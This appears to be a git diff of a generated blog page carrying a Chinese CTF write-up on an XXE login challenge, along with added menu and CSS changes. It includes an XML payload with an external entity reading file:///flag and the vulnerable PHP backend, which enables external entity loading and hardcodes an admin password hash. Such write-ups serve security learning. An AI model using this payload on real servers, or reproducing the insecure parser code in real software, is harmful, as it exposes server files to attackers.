@@ -82,6 +82,10 @@
       alert('朋友，IE浏览器未适配哦~');
     }
   </script>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head> 
 </html>
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
@@ -262,6 +266,27 @@
               </li>
             
               <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/fanju/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          追剧
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
                 <a href="/links/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -385,17 +410,17 @@
         
         <div class="entry-content">
           <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码    </p>
-<pre><code class="js">onclick=&quot;XMLFunction()&quot;
+<pre><code class="js">onclick="XMLFunction()"
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
-<pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;
+<pre><code class="js">&lt;script type="text/javascript"&gt;
         function XMLFunction(){
-            var xml = &#39;&#39; +
-                &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; +
-            &#39;&lt;root&gt;&#39; +
-            &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; +
-            &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; +
-            &#39; &lt;/root&gt;&#39;;
+            var xml = '' +
+                '&lt;?xml version="1.0" encoding="UTF-8"?&gt;' +
+            '&lt;root&gt;' +
+            ' &lt;username&gt;' + $('#username').val() + '&lt;/username&gt;' +
+            ' &lt;password&gt;' + $('#password').val() + '&lt;/password&gt;' +
+            ' &lt;/root&gt;';
             var xmlhttp = new XMLHttpRequest();
             xmlhttp.onreadystatechange = function () {
                 if(xmlhttp.readyState == 4){
@@ -405,15 +430,15 @@
 
                 }
             }
-            xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true);
+            xmlhttp.open("POST","login.php",true);
             xmlhttp.send(xml);
         };
     &lt;/script&gt;
 </code></pre>
 <p>构造xxe攻击<br><img src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包==传的时候记得把注释删去==</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<pre><code class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE root[
-&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;&lt;!--构造实体--&gt;
+&lt;!ENTITY flag SYSTEM "file:///flag"&gt;&lt;!--构造实体--&gt;
 ]&gt;
 &lt;root&gt;
 &lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt;
@@ -428,12 +453,12 @@
 * date: 2018-2-7
 */
 
-$USERNAME = &#39;admin&#39;; //账号
-$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码
+$USERNAME = 'admin'; //账号
+$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
 $result = null;
 
 libxml_disable_entity_loader(false);
-$xmlfile = file_get_contents(&#39;php://input&#39;);
+$xmlfile = file_get_contents('php://input');
 
 try{
     $dom = new DOMDocument();
@@ -444,15 +469,15 @@ try{
     $password = $creds-&gt;password;
 
     if($username == $USERNAME &amp;&amp; $password == $PASSWORD){
-        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
+        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",1,$username);
     }else{
-        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
+        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",0,$username);
     }    
 }catch(Exception $e){
-    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
+    $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",3,$e-&gt;getMessage());
 }
 
-header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+header('Content-Type: text/html; charset=utf-8');
 echo $result;
 ?&gt;
 </code></pre>
@@ -848,6 +873,27 @@ gitalk.render('gitalk-container')
                 <a href="/categories/资源/">
                   <i class="fa fa-cloud-download" aria-hidden="true"></i>
                   资源
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/fanju/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  追剧
                 </a>
               </li>
             
